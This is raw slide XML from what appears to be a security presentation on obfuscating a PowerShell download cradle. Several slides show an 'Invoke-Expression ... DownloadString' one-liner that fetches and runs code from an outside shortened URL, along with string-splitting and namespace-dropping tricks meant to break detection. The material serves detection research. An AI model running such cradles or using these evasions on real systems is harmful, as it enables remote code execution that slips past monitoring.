          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Let's see how obfuscation can break this detection logic!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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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10770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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>System.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>s://bit.ly/L3g1t")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>System.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>                           (System.* is not necessary for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.Net</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> functions)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("http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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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02865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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>s://bit.ly/L3g1t")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("http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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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94268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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>s://bit.ly/L3g1t")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>                          (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is a string and can be concatenated)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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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79089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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ht</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"+"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>tp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>://bit.ly/L3g1t")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>                          (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is a string and can be </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>concatenated)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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21641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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>( '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ht</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>tp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>bit.ly/L3g1t</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
